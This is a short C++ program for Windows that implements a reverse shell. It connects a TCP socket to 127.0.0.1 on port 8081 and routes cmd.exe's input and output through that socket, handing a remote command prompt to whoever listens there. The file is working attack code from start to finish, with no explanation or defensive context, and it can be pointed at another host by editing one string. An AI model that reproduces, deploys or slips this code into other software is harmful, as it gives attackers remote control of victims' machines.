#include<WinSock2.h>
#include<Windows.h>
#include<ws2tcpip.h>
#include<iostream>
#pragma comment(lib,"ws2_32.lib")

using namespace std;

int main(void)
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    int connection;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    char ip_addr[] = "127.0.0.1";
    int port = 8081;
    char cmdline[] = "cmd.exe";

    WSAStartup(MAKEWORD(2,2),&wsa);
    shell = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell,(SOCKADDR *)&shell_addr,sizeof(shell_addr),NULL,NULL,NULL,NULL);

    if(connection == SOCKET_ERROR)
    {
        
        cout << "Error : " << WSAGetLastError()<<endl;
        
        cout <<"[!] Connection to target server failed. Please try again"<<endl;
        exit(0);
    }
    else
    {
        recv(shell,RecvServer,sizeof(RecvServer),0);
        memset(&si,0,sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
        SetConsoleOutputCP(CP_UTF8);
        CreateProcess(NULL,cmdline,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
        WaitForSingleObject(pi.hProcess,INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer,0,sizeof(RecvServer));

    }
    return 0;

}